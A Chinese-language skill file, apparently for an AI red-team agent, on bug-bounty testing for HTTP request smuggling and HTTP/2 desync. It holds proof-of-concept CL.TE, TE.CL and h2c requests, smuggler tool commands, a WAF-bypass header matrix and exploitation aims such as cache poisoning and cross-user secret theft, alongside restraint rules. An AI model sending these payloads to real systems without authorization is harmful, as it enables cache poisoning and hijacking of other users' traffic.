---
name: http-smuggling
description: HTTP 请求走私与 H2 desync：利用前后端 Content-Length / Transfer-Encoding 解析差异，把半包塞进连接流影响下一个用户
whenToUse: 目标前面有 CDN/WAF/反代（Nginx、HAProxy、Cloudflare、Akamai），要试请求走私/连接去同步；命中 CL.TE、TE.CL、TE.TE、H2→H1 desync、CL.0 任一形态时加载
---

# HTTP Request Smuggling / HTTP/2 Desync

> 视角：黑盒，目标是利用前后端解析差异

## 1. 一句话说清

前置代理（CDN / WAF / Nginx）和后端服务器对 `Content-Length` / `Transfer-Encoding` 解析不一致 →
攻击者把"半包"塞进流，影响下个用户的请求/响应。
SRC 价值：成功的 desync = P1/P0（$2k–$10k+）。

---

## 2. 类型速览

| 类型 | 前置代理用 | 后端用 |
|------|----------|------|
| **CL.TE** | Content-Length | Transfer-Encoding |
| **TE.CL** | Transfer-Encoding | Content-Length |
| **TE.TE** | 都看，但前后处理混淆 | 同 |
| **HTTP/2 → HTTP/1 desync** | h2 | h1 后端 |
| **CL.0** | CL=0 后端忽略 | 后端读 body |

---

## 3. 探测手法

### 3.1 工具

```bash
# Burp 扩展
HTTP Request Smuggler

# 命令行
smuggler.py -u https://target -v
http2smugl quirks --target target.com:443
h2csmuggler -u https://target/ --path /admin
```

### 3.2 经典 PoC

#### CL.TE

```
POST / HTTP/1.1
Host: victim
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

前端按 CL=6 读了 `0\r\n\r\nG`，后端按 chunked 看到 `0\r\n\r\n` 结束，剩下 `G` 进入下一个请求。

#### TE.CL

```
POST / HTTP/1.1
Host: victim
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
...
0

```

#### 双 CL

```
POST / HTTP/1.1
Host: victim
Content-Length: 4
Content-Length: 1

GPOST...
```

#### CL.0（HTTP/2 时常见）

后端忽略 CL（POST 当 GET 处理），前端按 CL 取走 body → 走私。

#### h2c smuggling

```bash
h2csmuggler -u http://target/ --path /admin
# 利用 HTTP/1.1 → HTTP/2 升级让前置代理失效
```

---

## 4. Bypass 矩阵

| 拦 | 绕 |
|---|---|
| 标准 CL/TE 检测 | TE 大小写：`Transfer-encoding`、`transfer-Encoding` |
| TE 拦 | TE 末尾加空格：`Transfer-Encoding : chunked` |
| WAF 检测 | TE 值变形：`chunked`、`chunked,gzip`、`xchunked` |
| 标准 chunk 拦 | 0 大小 chunk 后塞数据 |
| h2 关闭 | h2c upgrade |

---

## 5. 利用提权 / 横向

```
1. 缓存投毒：让代理把恶意响应缓存为另一 URL
2. 跨用户访问：把 admin 端点的响应"借"给下个用户
3. 旁路 IP 限制：用走私走过 IP 校验
4. 偷 secret：让别人的请求 + 自己的响应混合
5. XSS（缓存了走私响应）
```

---

## 6. 真实案例指纹

- PortSwigger blog 系列（James Kettle）
- Cloudflare / Akamai 多次披露
- HackerOne H1 上 desync 报告 $5k–$30k

通用指纹：
- 同一连接发 2 个请求，第 2 个响应"看起来是别的请求的"
- 偶尔 503 / 502 / 异常 status code
- 代理日志和后端日志请求数对不上

---

## 7. 复现 / 证据要点

### 7.1 PoC

```
# 在 Burp Repeater 用 raw 模式发送下面包（保留 CRLF）
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0\r\n\r\nG

# 立即第二个请求（同连接，Burp Repeater 同样栏）
GET / HTTP/1.1
Host: target.com

→ 第二个响应应当反映前一次走私的 'G' 前缀
```

### 7.2 CVSS

```
HTTP smuggling → 缓存投毒          = 8.1 High
HTTP smuggling → 旁路鉴权           = 9.1 Critical
HTTP smuggling → 跨用户             = 8.1 High
```

---

## 8. 不要做的事

- **禁**：在生产上做大流量 desync 测试（影响他人请求）。低速、单次验证。
- **禁**：把走私构造的恶意响应缓存到全站共享路径（其他用户会受影响）。在你自己的 cache key 上演示。
- **禁**：实际偷取他人 cookie / token。看到 desync 现象即停。

## H1 真实案例（已外移到 references/）

真实案例指纹：公开案例的请求特征与判定要点

读取：`skills/redteam/references/http-smuggling/real-cases.md`

## Payload 库（已外移到 references/）

完整 payload 库：按服务端/中间件分类的走私载荷，含 CL.TE / TE.CL / TE.TE 变体与绕过组合

读取：`skills/redteam/references/http-smuggling/payload-library.md`

## 第二发（主力打不出去时，按这个顺序换）

1. **同类替代**（链路里的互补技能，手法最接近）：`dir-bruteforce`、`graphql-testing`、`injection-payloads`、`nuclei-scan`

2. **前提没满足就先回去**：`nuclei-scan` —— 上一环没做实，本环再试也是空打

3. **无回显 / 被拦**：先用 `oob-verification` 确认是不是真没打进去（没回显 ≠ 没命中）；确认被 WAF 拦就转 `waf-bypass`

4. **目标比预期更深**：换到同主题的专项靶子面 `competition-request-normalization-smuggling`

**纪律**：同一手法不许连打三次（第一次是验证、第二次换参数、第三次必须换手法）；换完还不动，就**如实回报**试过哪几条、各自现象是什么——这是下一次改打的依据，不是失败。

second-shot:end -->



<!-- pd-refs: 已外移的参考资料，勿手改本标记 -->

## 参考资料（按需读取，不在主文件里重复）

- `references/http-smuggling/payload-library.md` — 完整 payload 库：按服务端/中间件分类的走私载荷，含 CL.TE / TE.CL / TE.TE 变体与绕过组合
- `references/http-smuggling/real-cases.md` — 真实案例指纹：公开案例的请求特征与判定要点

<!-- skill-link-graph:build-skill-graph.mjs 生成，勿手改 -->

## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）

- **阶段**：3 漏洞发现｜**角色**：`vuln-scan`
- **上游**（先做完这些再进来）：`nuclei-scan`
- **下游**（产出交给谁）：`waf-bypass`、`unauth-exploit`
- **专项下游**（同主题更深的靶子面）：`competition-request-normalization-smuggling`
- **互补**（同类场景一起用）：`dir-bruteforce`、`graphql-testing`、`injection-payloads`、`nuclei-scan`
- **落库**（做完必须记进演练台，没落库的发现等于没发生）：`vuln` —— 用对应的 `redteam_*` 工具写入，带上原始请求/证据
- **收口必做**（打完不算完，要能证明）：命中判定走 `verification-discipline`（误报排除 + 修复五档判定）；打完之后要**补丁后复测**（补丁/修复后再打一遍，确认真的关掉了，而不是换个入口还能打）也走它；说清对手能不能发现走 `detection-pairing`（检测规则 + 响度）；战果归到哪个战术走 `attack-traceability`（ATT&CK 映射）

<!-- /skill-link-graph -->
